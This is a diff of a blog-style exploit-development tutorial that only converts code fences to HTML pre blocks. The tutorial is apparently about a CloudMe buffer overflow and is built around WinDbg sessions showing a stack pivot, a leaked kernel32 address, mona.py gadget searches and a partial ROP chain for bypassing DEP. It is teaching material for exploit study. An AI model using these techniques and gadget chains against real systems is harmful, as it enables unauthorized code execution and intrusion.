@@ -1045,12 +1045,12 @@ Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
 As we see, the <b>ESP</b> register points to <b>0x0022d694</b> which contains the pattern <b>35624334</b> (offset <b>0x224</b> from the beginning of the payload) ,which is expected considering we are jumping extra <b>548</b> bytes from the beginning of the payload ( <b>1916 - 1368</b> ).
 </p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> ? 0022d694 - 0022d470
 Evaluate expression: 548 = 00000224
 0:000> ? 0022d484 - esp
 Evaluate expression: 0 = 00000000
-```
+</pre>
 
 <p align="justify">
 At this point we are confident that we are moving in the right way. Furthermore, we should create another proof of concept script in order to see that we have full control when performing our stack pivot. All we want now is to find our landing location where we will put our <b>ROP</b> chain to bypass <b>DEP</b> protection.
@@ -1086,7 +1086,7 @@ except Exception as e:
 Below is the debugging <b>WinDbg</b> session corresponding to the PoC exploit above, that proves the successful pivoting
 </p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:016> bp 0x6998fb2e
 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
 0:016> bl
@@ -1133,7 +1133,7 @@ eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
 eip=42424242 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
 42424242 ?? ???
-```
+</pre>
 
 <p align="justify">
 As we see above, we have landed precisely into our placeholder at <b>"BBBBB"</b>. At this point we are ready to start building the ROP chain to bypass DEP, but before doing this we will search for gadgets to dynamically load the address of <b>VirtualProtect</b> function.
@@ -1158,16 +1158,16 @@ As previously mentioned, after scrolling down the stack view, there is a leaked 
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0022ED28 |75C44543 CEÄu kernel32.GetFullPathNameW
-```
+</pre>
 
 We can confirm that this address is referring at a **kernel32** function by using the following command
 
-```
-0:000\> dds 
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+0:000> dds 
 0022ED28 0022ed28 75c44543 kernel32!GetFullPathNameWStub [...]
-```
+</pre>
 
 At this point, we need to figure out how to:
 
@@ -1177,11 +1177,11 @@ At this point, we need to figure out how to:
 
 Before proceeding any further, let’s find all suitable ROP gadgets using **mona.py** as follows:
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !load pykd.pyd
 0:000> !py mona rop -n -o 
 [...]
-```
+</pre>
 
 <p align="justify">
 After a while we open <b>rop_suggestions.txt</b> and <b>rop.txt</b> in mona’s output directory ( <b>WinDbg</b> Debugger’s program folder). First let’s figure out a way to get the current stack address into <b>EAX</b> register. <b>EAX</b> is the register of choice because there are available gadgets of the following instruction <b>MOV EAX,DWORD PTR [EAX]</b> which will allow us to load the <b>kernel32</b> address into <b>EAX</b>. Before searching for suitable gadgets, we must also refer to the Module info inside the <b>rop_suggestions.txt</b> file in order to check which <b>.dll</b> has no restrictions. We found that the following <b>.dlls</b> have no restrictions
@@ -1203,7 +1203,7 @@ As we see above, there are many modules that we could search for gadgets. Afterw
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0x699012c9 # POP EBP # RETN [Qt5Network.dll]
 0x0385FF88 # Offset
 0x68a9559e # XCHG EAX,EBP # RETN [Qt5Core.dll]
@@ -1211,7 +1211,7 @@ As we see above, there are many modules that we could search for gadgets. Afterw
 0x0362fffc # Offset
 0x68ad422b # SUB EAX,ECX # RETN [Qt5Core.dll]
 0x68ae8a22 # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
-```
+</pre>
 
 
 <p align="justify">
